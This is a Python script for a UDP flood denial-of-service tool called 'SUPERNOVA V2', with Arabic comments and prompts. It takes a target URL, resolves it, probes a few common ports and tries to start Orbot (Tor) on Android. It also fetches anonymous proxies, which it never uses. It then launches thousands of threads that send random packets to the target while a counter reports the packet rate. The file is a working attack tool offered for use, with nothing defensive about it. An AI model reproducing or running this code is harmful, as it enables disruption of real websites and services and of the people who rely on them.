import os
import socket
import threading
import random
import time
import multiprocessing
import sys
import requests
from urllib.parse import urlparse

# --- إعدادات القوة القصوى ---
attack_count = 0
count_lock = threading.Lock()
proxy_pool = []

def clear():
    os.system('clear' if os.name == 'posix' else 'cls')

def banner():
    print(f"""
    ███████╗████████╗ ██████╗ 
    ██╔════╝╚══██╔══╝██╔═══██╗
    ███████╗   ██║   ██║   ██║
    ╚════██║   ██║   ██║   ██║
    ███████║   ██║   ╚██████╔╝
    ╚══════╝   ╚═╝    ╚═════╝ 
    [!] sTo: SUPERNOVA V2 | Fixed & Optimized
    [!] Mode: Full Auto | DNS Mask | No-Limit Storm
    ==============================================
    """)

def auto_setup():
    """تجهيز البروكسيات ومحاولة تشغيل Orbot"""
    global proxy_pool
    print("[🛡️] جاري تحصين الاتصال وتجهيز البروكسيات...")
    try:
        # محاولة فتح Orbot تلقائياً
        os.system("am start -n org.torproject.android/.OrbotMainWindow > /dev/null 2>&1")
        print("[+] تم إرسال طلب تشغيل Orbot. تأكد من ضغط (Start) إذا لم يعمل.")
        
        # جلب بروكسيات نخبة
        res = requests.get("https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http&timeout=5000&anonymity=elite", timeout=5)
        if res.status_code == 200:
            proxy_pool = res.text.splitlines()
            print(f"[+] تم حقن {len(proxy_pool)} نقطة تخفي.")
    except:
        print("[-] سيتم العمل بنظام التزييف المباشر لضمان السرعة.")

def auto_scan(ip):
    print(f"[*] فحص المنافذ المفتوحة تلقائياً في {ip}...")
    # الفحص السريع لأكثر المنافذ تأثراً
    for p in [443, 80, 8080, 53]:
        try:
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                s.settimeout(0.3)
                if s.connect_ex((ip, p)) == 0:
                    print(f"[+] تم تحديد المنفذ الهدف: {p}")
                    return p
        except: continue
    return 80

def supernova_engine(ip, port, stop_event, packet_data):
    global attack_count
    # استخدام UDP للسرعة الخام
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while not stop_event.is_set():
        try:
            sock.sendto(packet_data, (ip, port))
            with count_lock:
                attack_count += 1
        except:
            continue

def monitor(stop_event):
    start_t = time.time()
    while not stop_event.is_set():
        dur = time.time() - start_t
        if dur > 0:
            pps = attack_count / dur
            sys.stdout.write(f"\r[🚀] الحزم: {attack_count} | السرعة: {int(pps)} Packets/Sec | القوة: 100% ")
            sys.stdout.flush()
        time.sleep(0.1)

def launch():
    global attack_count
    attack_count = 0
    clear()
    banner()

    url = input("[🔗] أدخل رابط الهدف: ")
    try:
        domain = urlparse(url).netloc or url.split('/')[0]
        ip = socket.gethostbyname(domain)
    except:
        print("[-] رابط غير صالح!"); return

    auto_setup()
    port = auto_scan(ip)
    
    # اختيار عدد الخيوط
    print(f"\n[⚡] جهازك (ريد ماجيك) يدعم قوة هائلة.")
    threads_input = input("اختر عدد الخيوط (ينصح بـ 3000 فأكثر): ")
    threads_count = int(threads_input) if threads_input else 2000

    # توليد بيانات الحزمة بطريقة متوافقة (Fixed Payload)
    packet_data = os.urandom(1024) 
    
    stop_event = threading.Event()
    print(f"\n[🔥] بدء الهجوم الشامل... راقب العداد:")
    
    threading.Thread(target=monitor, args=(stop_event,), daemon=True).start()

    # تشغيل المحركات
    for _ in range(threads_count):
        t = threading.Thread(target=supernova_engine, args=(ip, port, stop_event, packet_data))
        t.daemon = True
        t.start()

    try:
        while True: time.sleep(1)
    except KeyboardInterrupt:
        stop_event.set()
        print(f"\n\n[+] تم الإيقاف. الإجمالي المرسل: {attack_count}")

if __name__ == "__main__":
    launch()
